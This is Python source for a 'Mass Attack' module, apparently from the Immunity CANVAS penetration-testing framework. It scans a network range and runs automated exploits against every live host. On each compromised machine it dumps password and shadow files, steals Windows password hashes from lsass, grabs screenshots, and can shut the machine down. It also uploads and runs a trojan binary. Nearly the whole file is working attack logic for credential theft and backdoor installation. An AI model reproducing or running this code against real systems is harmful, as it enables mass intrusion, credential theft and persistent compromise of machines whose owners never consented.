#! /usr/bin/env python
"""
massattack.py
"""

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2003
#http://www.immunityinc.com/CANVAS/ for more information


#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation


NAME="Mass Attack"
VERSION="1.0"
NOTES2="""

"""

CHANGELOG="""
1.0 
Created.
"""

DEBUGNOTES="""
    
"""

import os,getopt
import sys
if "." not in sys.path: sys.path.append(".")

import timeoutsocket
        
import socket
from exploitutils import *

from tcpexploit import tcpexploit
from msrpc import *
import canvasengine
import time

from libs.ctelnetlib import Telnet
from shelllistener import shelllistener
from shelllistener import shellfromtelnet

import libs.canvasos as canvasos

DOCUMENTATION={}
DOCUMENTATION["Notes"]="""
For a given network range do the following actions:
1. Find all the alive hosts
2. For each alive host run Autohack
3. If autohack reports success run a postscript on the node and exit cleanly
4. If we get a newnode and you've placed massattack_win32trojan.exe in the CANVAS root, it will be uploaded and run.
5. Write a little report about it using our reporting module

TODO:
Future releases want to fingerprint each host so that if a host changes IP, we still
know where it is.
"""

NAME="MassAttack"
DESCRIPTION="Multi-threaded attack tool"

VERSION="0.1"

#affectsList=["Recon"]
PROPERTY = {}
PROPERTY['TYPE'] = "Tools"

NOTES=""" 

"""

import libs.reporting as reporting
from hostKnowledge import *
from engine.config import canvas_resources_directory
import os
from engine.config import canvas_reports_directory
import traceback

from engine import CanvasConfig

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.vulns=[]
        self.setPort(0)
        self.setHost("")
        self.setVersion(1)
        self.istest=0
        self.setVersions()
        self.shellcode="A"
        self.localhost=""
        self.localport=0
        self.ssl=0
        self.doshell=1
        self.force=0
        self.name=NAME
        self.netmask="32"
        self.report=None
        self.portscan=1 #default is do a portscan
        self.followup=None #module to run on all successful targets (like startup)
        
        #self.onlymodule=None
        self.exploit_modules=None ##None runs all autohack modules, otherwise supply a list of names to run
        
        self.dead_thread_timeout=600 ##time to spin in wait_for_threads() until we decide we have a rouge thread and kill it
        self.autohack_module_table={}
        
        self.ignore_unid_hosts=1
        self.silica=False
        self.ssid=self.tpref=""
        self.localips=[]
        self.sshot=False
        #specific options from canvas.conf
        self.options={"trojan_win32Node": "bob.exe", "doscreengrab": False, "dogethashes": True, "Halt": False}
        return

    def massattack_set_current_autohack_module(self, info):
        
        ip, module_name, thread_id = info
        self.autohack_module_table[ip]={module_name: thread_id}
        
    def get_autohack_current_module(self, ip):
        try:
            return self.autohack_module_table[ip]
        except KeyError:
            return "Unknown IP of %s cannot find module mapping."%(ip)
    
    def run_on_host(self,target):
        """
        runs once on each host that is alive in the netrange
        """

        #first we check to see if we are running on ourselves, which is bad
        #localips is setup in run(), we bypass this because silica might have some
        # from a previous scan
        if target.interface in self.localips and self.argsDict.get("silica",self.silica) == False:
            self.log("Not running on localip %s"%target.interface)
            return
        
        if self.state==self.HALT:
            self.log("Massattack was told to halt")            
            return 
        host=target.interface
        self.log("Running on %s"%host)
        self.setInfo("Running on %s"%host)
        self.report.newhost(target)


        try:
            app=self.engine.getModuleExploit("autohack")
            app.link(self)
            app.target=target
            app.argsDict["netmask"]="32" #hardcode to one ip
            #app.onlymodule=self.onlymodule
            app.exploit_modules=self.exploit_modules
            app.portscantype="fast"
            app.ignore_unidentified_hosts=self.ignore_unid_hosts
            ##Set this mass attack threads autohack current module to reflect that of the autohack modules curent module object
            app.set_current_autohack_module=self.massattack_set_current_autohack_module
            try:
                #if any sort of problem happens here, we don't want it to 
                #prevent us from freeing the thread resource...
                #this is all in one thread - we need to return before massattack
                #finishes
                #this is an autohack exploit instance
                ret=app.run()
            except:
                self.log("Exception caused in autohack run")
                #debug
                traceback.print_exc(file=sys.stdout)
                if self.silica:
                    outfile=file("SILICA.log","w")
                    traceback.print_exc(file=outfile)
                    outfile.close()
                ret=0
                return 
            result=app.result
            print "Got from exploit: ", app.result
            print "exploit returned to us: ", ret
            
            self.report.add_extras(ret)
            if not result:
                print "exploit failed: ", target
                self.report.report_failure(target)
  
            else:
                print "exploit succeeded: ", target, result
                for target,usedvuln,newnode in result:
                    self.log("We succeeded in penetrating %s"%host)
                    #newnode MAY be None in certain error cases
                    #in that case, we simply continue
                    self.report.report_success(target,usedvuln)
                    if newnode!=None:
                        type1=newnode.nodetype
                        self.log("Nodetype on %s is %s"%(host, type1))
                        # This is unix type do something useful
                        if type1=="UnixShellNode":
                            #TODO: here we are assuming OS X I think! We need to make this generica
                            cdata=newnode.runcommand("/usr/bin/nidump passwd . && cat /var/db/shadow/hash/*")
                            self.report.note(target, cdata)

                        elif "Solaris" in newnode.capabilities:
                            self.log("Owned Solaris target")
                            cdata=newnode.runcommand("cat /etc/passwd && cat /etc/shadow && ls -lart /tmp/ && last")
                            self.report.note(target, cdata)

                        elif "linux" in newnode.capabilities:
                            self.log("Owned Linux target")
                            cdata = newnode.runcommand("id && uname -a && cat /etc/passwd && cat /etc/shadow")
                            self.report.note(target, cdata)
                            
                        # Win32 so we try hashes or screengrab
                        elif "win32api" in newnode.capabilities:
                            if self.options["dogethashes"]:
                                self.log("Migrating into lsass")
                                ret=self.exploitnodes("mosdefmigrate",[newnode])
                                self.log("Grabbing password hashes")
                                ret=self.exploitnodes("getpasswordhashes",[newnode])[0]
                                if ret:
                                    users=ret
                                    for user in users:
                                        self.report.note(target, "%s:%s:%s:%s:::"%(prettyprint(user[0]),prettyprint(user[1]),cleanhexprint(user[2]),cleanhexprint(user[3])))
                                else:
                                    self.report.note(target,"Getting password hashes failed - LSA Service is damaged!")
                                    
    
                            if self.options["doscreengrab"]:
                                self.log("Grabbing screenshot")
                                ret=self.exploitnodes("screengrab",[newnode])
                                if ret:
                                    self.log("Reporting image on %s to %s"%(target.interface,ret))
                                    self.report.setImage( target, ret )
                                    
                            if self.options["Halt"]:        
                                self.exploitnodes("ExitWindows",[newnode])
                            
                            
                            if not self.silica:
                                self.log("looking for trojan for %s"%newnode.nodetype)
                                bdname=self.options.get("trojan_%s"%newnode.nodetype)
                                self.log("Trojan name: %s"%bdname)
                                bdfile=None
                                
                                if bdname:
                                    try:
                                        bdfile=file(bdname, "rb")
                                    except:
                                        self.log("No backdoor file found for uploading")
                                if bdfile:
                                    #we have a trojan
                                    self.log("Uploading and executing trojan")
                                    #uploading is the same for all nodes
                                    newnode.upload(bdname)
                                    #unix nodes need a ./
                                    if not "win32api" in newnode.capabilities:
                                        bdname="./%s"%bdname
                                    newnode.spawn(bdname)
                                    
        
                            if self.followup:
                                self.exploitnodes(self.followup,[newnode])
                                self.log("Ran followup on %s"%host)
                            else:
                                self.log("Followup on %s not requested"%host)
                    else:
                        self.log("Did not get a node for host %s"%host)
        except:
            self.report.note(target, "Exception occured while handling this host: %s"%traceback.format_exc())
            traceback.print_exc(file=sys.stdout)

        return
    
    def getargs(self):
        self.host=self.target.interface
        self.netmask=dInt(str(self.argsDict.get("netmask",self.netmask)).replace("/",""))
        self.portscan=int(self.argsDict.get("portscan",self.portscan))
        self.maxthreads=int(self.argsDict.get("maxthreads",self.maxthreads))
        #self.onlymodule=self.argsDict.get("onlymodule",self.onlymodule)
        self.exploit_modules=self.argsDict.get("exploit_modules",self.exploit_modules)
        self.ignore_unid_hosts=self.argsDict.get("ignore_unid_hosts",self.ignore_unid_hosts)
        self.ssid=self.argsDict.get("ssid",self.ssid)
        self.silica=self.argsDict.get("silica",self.silica)
        self.tpref=self.argsDict.get("tpref",self.tpref)
        self.sshot=self.argsDict.get("sshot",self.sshot)

        # overide CANVAS config in SILICA
        if self.silica:
            if self.sshot:
                self.options["doscreengrab"]=True
                self.options["dogethashes"]=False
            else:
                self.options["doscreengrab"]=False
                self.options["dogethashes"]=True
                
        # Normal CANVAS
        else:
            self.options["doscreengrab"]=CanvasConfig['massattack_doscreengrab']
            self.options["dogethashes"]=CanvasConfig['massattack_dogethashes']
            
        return
    

    def scan_lock(self):
        print "Creating lock file...",
        fp = open("SCAN_LOCK", "w")
        fp.close()
        print "done"
            
            
    def scan_unlock(self):
        print "Unlocking any active/stale files...",
        #if the file is not there, we ignore this
        try:
            os.unlink("SCAN_LOCK")
        except:
            pass 
        print "done"

    
    def run(self):
        sil_flag=False 
        if self.argsDict.get("silica"):
            sil_flag=True
            self.scan_lock()
        self.getargs()
        
        self.localips=[]
        for node in self.argsDict.get("passednodes",[]):
            self.localips+=node.getallips()
            
        self.setInfo("Attacking: %s"%(self.host))
        self.log("Interface=%s"%self.host)
        self.log("Netmask=%s"%self.netmask)
        self.log("MaxThreads=%d"%self.maxthreads)
        self.report=reporting.report(self.tpref, sil_flag)
        self.vulns=[] #clear it
        #print ips

        if not canvasengine.registeredallmodules:
            canvasengine.registerAllModules()
        #time our scan run
        now=time.localtime(time.time())
        # %y is broken it reports something like '22'
        strtime=time.strftime("%Y/%m/%d %H:%M", now)
        self.log("Start time: %s"%strtime)
        tc0=time.time()
        self.node=self.argsDict["passednodes"][0]
        dothreads = "threads" in self.node.capabilities
        if not dothreads:
            self.log("Warning: not using threads because selected node does not support threading")
            
        self.setInfo("[MassAttack] Scanning network: %s/%s"%(self.host, self.netmask))
        self.setProgress(5)
        self.run_on_all_alive_hosts(threads=dothreads, timeout=self.dead_thread_timeout)

        #end of our timing ...
        now=time.localtime(time.time())
        # same as above
        strtime=time.strftime("%Y/%m/%d %H:%M", now)
        self.log("Stop time: %s"%strtime)

        tc1=time.time()
        self.log("Seconds used: %s"%(tc1-tc0))

        if(self.silica):
            filename="%sMA_Report_%s_%s_%s.html"%(self.tpref, self.ssid,self.host,tc1)
        else:
            filename="Mass_Attack_report_%s_%s.html"%(self.host,self.netmask)
        
        filename = filename.replace("/", "")        
        filename = os.path.join(canvas_reports_directory, filename)
        
        data=self.report.generate_massattack_html()
        file(filename,"wb").write(data)
        self.log("Wrote HTML formatted report to: %s"%filename)
        self.setInfo("Scanning %s (done)"%(self.host))
        if self.argsDict.get("silica"):
            self.scan_unlock()
        return 1
        
        
    def setVersions(self):
        self.versions={}
        self.versions[1]=("All", None)
        
        
    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])
            
        
def usage():
    app = theexploit()
    print "Usage: "+sys.argv[0]+" [-T] [-v version]  -t target [ -p targetport:%d]"%(app.port)
    app.displayVersions()
    sys.exit()

#this stuff happens.
if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)

